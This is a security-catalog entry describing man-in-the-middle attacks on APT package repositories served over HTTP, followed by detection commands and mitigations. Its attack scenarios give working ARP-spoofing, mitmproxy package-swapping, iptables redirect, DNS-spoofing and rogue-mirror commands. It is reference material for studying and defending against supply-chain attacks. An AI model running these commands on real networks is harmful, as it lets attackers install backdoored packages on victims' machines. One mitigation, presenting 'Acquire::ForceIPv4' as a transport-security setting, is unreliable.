---
name: "APT Repository Man-in-the-Middle Attack"
packageManager: "apt"
slug: "apt-repo-mitm"
category: "Supply Chain"
severity: "medium"
platform:
  - "Linux"
description: "Many APT repositories still serve packages over unencrypted HTTP, making them vulnerable to man-in-the-middle (MITM) attacks. An attacker positioned on the network path between the client and the repository server can intercept apt-get update and apt-get install requests, injecting modified Release metadata and substituting legitimate .deb packages with trojanized versions. While APT's GPG signature verification provides some protection, it only covers repository metadata integrity, not confidentiality, and can be bypassed if combined with other techniques such as signature bypass or if the repository is unsigned."
prerequisites:
  - "Network position allowing interception of traffic between the target and the APT repository (e.g., shared Wi-Fi, compromised router, ISP-level access, ARP spoofing)"
  - "The target system must have at least one APT source configured over HTTP (not HTTPS)"
  - "For full package replacement: ability to bypass or strip GPG signatures, or target an unsigned repository"
attackScenarios:
  - title: "Intercepting HTTP APT Traffic with ARP Spoofing and mitmproxy"
    description: "An attacker on the same network segment uses ARP spoofing to redirect the target's HTTP traffic through their machine. Using mitmproxy or a custom proxy, they intercept APT repository requests and serve modified package files containing backdoors."
    commands:
      - label: "Identify HTTP-based APT sources on the target (reconnaissance)"
        code: |
          # Many default installations still use HTTP
          grep -r "^deb http://" /etc/apt/sources.list /etc/apt/sources.list.d/
          # Common HTTP repos:
          # deb http://archive.ubuntu.com/ubuntu/ jammy main
          # deb http://security.ubuntu.com/ubuntu/ jammy-security main
        language: "bash"
      - label: "Set up ARP spoofing on the attacker machine"
        code: |
          # Enable IP forwarding
          echo 1 > /proc/sys/net/ipv4/ip_forward
          # ARP spoof to intercept traffic from target (192.168.1.100) to gateway (192.168.1.1)
          arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &
          arpspoof -i eth0 -t 192.168.1.1 192.168.1.100 &
        language: "bash"
      - label: "Intercept and modify APT traffic with mitmproxy"
        code: |
          # Use a mitmproxy script to replace .deb downloads
          cat > apt_mitm.py << 'EOF'
          from mitmproxy import http
          import os

          def response(flow: http.HTTPFlow):
              if flow.request.pretty_url.endswith(".deb"):
                  pkg_name = flow.request.pretty_url.split("/")[-1]
                  malicious_path = f"/tmp/malicious-debs/{pkg_name}"
                  if os.path.exists(malicious_path):
                      with open(malicious_path, "rb") as f:
                          flow.response.content = f.read()
                      # Update Content-Length header
                      flow.response.headers["Content-Length"] = str(len(flow.response.content))
          EOF
          mitmproxy --mode transparent -s apt_mitm.py -p 8080
        language: "python"
      - label: "Redirect HTTP traffic through the proxy"
        code: |
          # iptables rule to redirect HTTP traffic from target through mitmproxy
          iptables -t nat -A PREROUTING -i eth0 -s 192.168.1.100 -p tcp --dport 80 -j REDIRECT --to-port 8080
        language: "bash"
  - title: "DNS Spoofing to Redirect APT Repository Requests"
    description: "An attacker poisons DNS responses to redirect the target's APT repository hostname to an attacker-controlled server hosting a malicious APT repository mirror with trojanized packages."
    commands:
      - label: "Set up a rogue DNS response for the repository hostname"
        code: |
          # Using ettercap for DNS spoofing
          echo "archive.ubuntu.com A 192.168.1.200" >> /etc/ettercap/etter.dns
          echo "security.ubuntu.com A 192.168.1.200" >> /etc/ettercap/etter.dns
          ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /192.168.1.100// /192.168.1.1//
        language: "bash"
      - label: "Host a malicious APT mirror on the attacker's server"
        code: |
          # Create a partial mirror with trojanized packages
          mkdir -p /var/www/ubuntu/dists/jammy/main/binary-amd64/
          mkdir -p /var/www/ubuntu/pool/main/
          # Copy the trojanized .deb files to pool
          cp /tmp/backdoored-packages/*.deb /var/www/ubuntu/pool/main/
          # Generate Packages and Release files
          cd /var/www/ubuntu
          dpkg-scanpackages pool/ /dev/null | gzip > dists/jammy/main/binary-amd64/Packages.gz
          apt-ftparchive release dists/jammy/ > dists/jammy/Release
          # Start serving
          python3 -m http.server 80 --directory /var/www/ubuntu/
        language: "bash"
detection:
  - title: "Audit APT sources for HTTP usage"
    description: "Identify all APT repository sources configured to use unencrypted HTTP. These are vulnerable to MITM attacks and should be migrated to HTTPS wherever possible."
    commands:
      - code: |
          # Find all HTTP (non-HTTPS) APT sources
          grep -rn "^deb http://" /etc/apt/sources.list /etc/apt/sources.list.d/ 2>/dev/null
          # Count HTTP vs HTTPS sources
          echo "HTTP sources:"
          grep -rc "^deb http://" /etc/apt/sources.list /etc/apt/sources.list.d/ 2>/dev/null
          echo "HTTPS sources:"
          grep -rc "^deb https://" /etc/apt/sources.list /etc/apt/sources.list.d/ 2>/dev/null
        language: "bash"
  - title: "Detect ARP spoofing and network anomalies"
    description: "Monitor for ARP spoofing indicators that may signal an active MITM attack on the local network, particularly during apt-get operations."
    commands:
      - code: |
          # Check for duplicate MAC addresses in ARP table (indicator of ARP spoofing)
          arp -a | awk '{print $4}' | sort | uniq -d
          # Monitor ARP table changes
          arpwatch -i eth0
          # Check for unexpected changes in package checksums after download
          apt-get download package-name 2>/dev/null && dpkg-deb --info package-name*.deb
        language: "bash"
  - title: "Verify package integrity post-download"
    description: "Compare downloaded package hashes against known-good values from official sources to detect tampered packages."
    commands:
      - code: |
          # Verify package checksums against Release file
          apt-get download openssh-server 2>/dev/null
          sha256sum openssh-server*.deb
          # Compare against the hash in the repo metadata
          zcat /var/lib/apt/lists/*_Packages | grep -A5 "Package: openssh-server" | grep SHA256
        language: "bash"
mitigation:
  - "Convert all APT sources from HTTP to HTTPS by replacing http:// with https:// in sources.list and sources.list.d/"
  - "Install the apt-transport-https package if needed for HTTPS support on older systems"
  - "Ensure GPG signature verification is enabled and enforced for all repositories (never use trusted=yes with HTTP sources)"
  - "Use Acquire::ForceIPv4 or Acquire::https to enforce transport security in APT configuration"
  - "Deploy network-level protections against ARP spoofing (dynamic ARP inspection, static ARP entries for critical hosts)"
  - "Use a local APT caching proxy (apt-cacher-ng) with HTTPS upstream to reduce exposure on untrusted networks"
  - "Consider using Tor-based APT transport (apt-transport-tor) for additional anonymity and MITM resistance"
references:
  - title: "Debian Wiki - SecureApt"
    url: "https://wiki.debian.org/SecureApt"
  - title: "apt-transport-https - Debian Package"
    url: "https://packages.debian.org/bookworm/apt-transport-https"
  - title: "A Systematic Analysis of the Security of APT Repositories (Academic Paper)"
    url: "https://arxiv.org/abs/2005.09535"
  - title: "Debian Wiki - AptTransportTor"
    url: "https://salsa.debian.org/apt-team/apt-transport-tor"
created: 2026-04-02
updated: 2026-04-02
---
